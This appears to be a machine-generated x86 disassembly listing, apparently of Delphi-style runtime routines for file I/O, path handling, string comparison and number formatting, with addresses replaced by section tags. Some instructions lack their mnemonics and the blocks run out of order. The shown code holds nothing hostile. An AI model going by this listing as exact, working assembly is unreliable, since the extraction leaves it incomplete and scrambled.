lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_408060
sub_408750
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402dc4
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408770
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_404f98
mov [ esi ] eax
mov [ esi + 0x4 ] edx
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408790
mov eax [ rw-data ]
call sub_4051c8
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_4051c8
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405384
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_404174
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405384
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_404174
sub_408820
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_408320
test al al
je r-xdata
sub_40885c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_409aa0
mov edx eax
test dl dl
je r-xdata
call sub_408790
push ebp
mov eax [ rw-data ]
call sub_4051d0
mov edx eax
mov eax [ rw-data ]
call sub_408820
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_4051d0
mov edx eax
mov eax [ rw-data ]
call sub_408820
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_4088f8
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404174
call sub_408790
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_404174
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_404174
jmp r-xdata
pop esi
pop ebx
retn
sub_408944
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_4045e0
push eax
call CreateFileA
sub_40899c
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_4045e0
push eax
call CreateFileA
pop ebx
retn
sub_4089c8
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4089f4
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408a20
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_408a60
push ebx
push esi
mov esi eax
mov eax esi
call sub_4043e0
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c640
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_408a90
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_4043e0
mov edi eax
mov eax ebx
call sub_4045e0
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_408d94
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40c640
cmp al 0x2
jne r-xdata
dec edi
sub_408ae0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_408a90
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_404640
pop edi
pop esi
pop ebx
retn
sub_408b18
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_408a90
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_404120
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_404640
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_408b60
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_4045e0
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_404210
add esp 0x108
pop esi
pop ebx
retn
sub_408b9c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404f74
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404f74
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_408c4c
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_408c74
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_408ca8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_4043e0
push eax
mov eax ebx
call sub_4045e0
mov edx eax
mov eax esi
pop ecx
call sub_408c74
pop esi
pop ebx
retn
sub_408ccc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_4045e0
mov edx eax
mov ecx edi
mov eax ebx
call sub_408c74
pop edi
pop esi
pop ebx
retn
sub_408cec
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_408d10
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408d50
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408da8
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_408e1c
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_408c10
mov esi eax
inc esi
mov eax esi
call sub_408dfc
mov ecx esi
mov edx ebx
call sub_408c3c
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408e58
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c664
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_408c3c
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_408060
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408ee0
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_409237
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_408fc2
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_40900a
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_408fc2
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_408ed4
pop edx
or edx edx
je r-xdata
sub_408fc2
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_409237
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_40900a
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_409237
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408e58
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_409031 ]
mov ebx ecx
sub cl 0x44
je sub_4085e0
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_404348
jmp r-xdata
mov esi sub_4043a8
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_4085e0
sub cl 0x44
je sub_408574
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_408574
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_4085e0
mov ecx 0x10
cmp bl 0x58
je sub_408574
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408eb0
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_4093f0
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_408574
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_409258
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408c10
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408ee0
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_409298
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408c10
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408ee0
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4092ec
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_4043e0
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_4043e0
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_4043e0
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408ee0
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_404210
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_404120
mov eax esi
mov edx ebx
call sub_40476c
mov eax [ ebp - 0x4 ]
call sub_4043e0
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408ee0
mov edx esi
xchg edx eax
call sub_40476c
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4093ac
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_4093f0
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_4096c4
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_4094ef
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_4094f9
call sub_4094ef
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_4093ac
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_409555
call sub_4094ef
call sub_4094e6
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_4094e6
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_4093ac
retn
xor ecx ecx
sub_409591
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_4094e6
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_4094e6
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_4095f6
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_40964a
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_409591
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_4096c4
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_4096f1
jmp r-xdata
call sub_409813
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_4096f1
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402ee4
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_409813
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_4098f0
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
